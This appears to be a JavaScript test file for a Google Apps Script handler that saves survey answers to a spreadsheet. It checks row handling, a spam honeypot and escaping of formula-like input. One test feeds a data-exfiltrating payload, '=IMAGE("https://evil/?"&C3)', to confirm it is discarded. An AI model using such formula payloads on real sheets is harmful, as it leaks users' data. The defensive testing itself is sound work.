// Проверка gas/Code.gs без Google: SpreadsheetApp, LockService и ContentService подменены таблицей в памяти.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import vm from 'node:vm';

const code = readFileSync(new URL('../gas/Code.gs', import.meta.url), 'utf8');
const html = readFileSync(new URL('../src/index.html', import.meta.url), 'utf8');

function load(opt = {}) {
  const rows = [];
  const range = (r, c, nr = 1, nc = 1) => ({
    getValues: () => Array.from({ length: nr }, (_, i) => Array.from({ length: nc }, (_, j) => rows[r - 1 + i]?.[c - 1 + j] ?? '')),
    setValues: v => v.forEach((row, i) => row.forEach((x, j) => { rows[r - 1 + i][c - 1 + j] = x; })),
    setFontWeight() { return this; }, setBackground() { return this; }, setNumberFormat() { return this; }, setWrap() { return this; },
  });
  const sheet = {
    getLastRow: () => rows.length,
    appendRow: r => { if (opt.failWrite) throw new Error('Service Spreadsheets failed'); rows.push([...r]); },
    setFrozenRows() {},
    getRange: (a, ...rest) => typeof a === 'string' ? range(1, 1) : range(a, ...rest),
  };
  let created = 0, released = 0;
  const ctx = {
    SpreadsheetApp: { getActiveSpreadsheet: () => ({ getSheetByName: () => (created ? sheet : null), insertSheet: () => (created++, sheet) }) },
    LockService: { getScriptLock: () => ({ tryLock: () => !opt.busy, waitLock() { if (opt.busy) throw new Error('Lock timeout'); }, releaseLock() { released++; } }) },
    ContentService: { MimeType: { JSON: 'json' }, createTextOutput: t => ({ text: t, setMimeType() { return this; } }) },
  };
  vm.createContext(ctx);
  vm.runInContext(code, ctx);
  return { ctx, rows, released: () => released };
}

// дата создаётся внутри vm-контекста со своим Date, поэтому instanceof не годится
const isDate = v => Object.prototype.toString.call(v) === '[object Date]';
const answers = Object.fromEntries(Array.from({ length: 10 }, (_, i) => ['q' + (i + 1), 'ответ ' + (i + 1)]));
const form = (extra = {}) => ({ parameter: { name: 'Иван Петров', id: 'g-1', ...answers, ...extra } });
const reply = r => JSON.parse(r.text);

test('первая анкета создаёт заголовок и строку: имя, десять ответов, ID', () => {
  const { ctx, rows } = load();
  assert.deepEqual(reply(ctx.doPost(form())), { ok: true });
  assert.equal(rows.length, 2);
  assert.equal(rows[0].length, 14);
  assert.equal(rows[0][2], 'Имя');
  assert.ok(isDate(rows[1][0]));
  assert.deepEqual(rows[1].slice(2), ['Иван Петров', ...Object.values(answers), 'g-1']);
});

test('исправленная анкета обновляет свою строку, другая анкета добавляет новую', () => {
  const { ctx, rows } = load();
  ctx.doPost(form());
  ctx.doPost(form({ id: 'g-2', name: 'Мария' }));
  const first = rows[1][0];
  ctx.doPost(form({ q1: 'передумал', q2: '' }));
  assert.equal(rows.length, 3);
  assert.equal(rows[1][0], first);
  assert.ok(isDate(rows[1][1]));
  assert.equal(rows[1][3], 'передумал');
  assert.equal(rows[1][4], '');
  assert.equal(rows[2][2], 'Мария');
});

test('пустое имя отклоняется, ловушка для роботов молча принимается без записи', () => {
  const { ctx, rows } = load();
  assert.equal(reply(ctx.doPost(form({ name: '   ' }))).ok, false);
  assert.deepEqual(reply(ctx.doPost(form({ website: 'http://spam' }))), { ok: true });
  assert.equal(rows.length, 0);
});

test('текст, похожий на формулу, записывается как текст; длинный ответ обрезается', () => {
  const { ctx, rows } = load();
  ctx.doPost(form({ q1: '=HYPERLINK("http://x")', q2: 'я'.repeat(3000), name: '+7 999' }));
  assert.equal(rows[1][2], "'+7 999");
  assert.equal(rows[1][3], '\'=HYPERLINK("http://x")');
  assert.equal(rows[1][4].length, 1000);
});

test('вопросы в таблице дословно совпадают с вопросами на странице, поля формы — с полями скрипта', () => {
  const { ctx } = load();
  const onPage = [...html.matchAll(/<label for="q(\d+)"><span class="q__n">\d+<\/span><span class="q__t">([^<]+)<\/span>/g)].map(m => m[2]);
  const inScript = vm.runInContext('QUESTIONS', ctx);
  assert.equal(onPage.length, 10);
  assert.deepEqual(onPage, [...inScript]);
  for (let i = 1; i <= 10; i++) assert.match(html, new RegExp(`<textarea id="q${i}" name="q${i}"`));
  assert.match(html, /name="name"/);
  assert.match(html, /name="website"/);
});

test('ID анкеты не может стать формулой: посторонний формат отбрасывается', () => {
  const { ctx, rows } = load();
  assert.deepEqual(reply(ctx.doPost(form({ id: '=IMAGE("https://evil/?"&C3)' }))), { ok: true });
  assert.equal(rows[1][13], '');
  ctx.doPost(form({ id: '0b0e7a52-6c1f-4c0e-9d53-1f2a3b4c5d6e', name: 'Мария' }));
  assert.equal(rows[2][13], '0b0e7a52-6c1f-4c0e-9d53-1f2a3b4c5d6e');
  for (const row of rows.slice(1)) for (const cell of row) assert.ok(typeof cell !== 'string' || !/^[=+@-]/.test(cell), 'формула в ячейке: ' + cell);
});

test('сбой записи и занятая блокировка возвращают {ok:false}, а не исключение', () => {
  const a = load({ failWrite: true });
  const r1 = reply(a.ctx.doPost(form()));
  assert.equal(r1.ok, false);
  assert.equal(a.released(), 1);
  const b = load({ busy: true });
  const r2 = reply(b.ctx.doPost(form()));
  assert.equal(r2.ok, false);
  assert.equal(b.rows.length, 0);
});
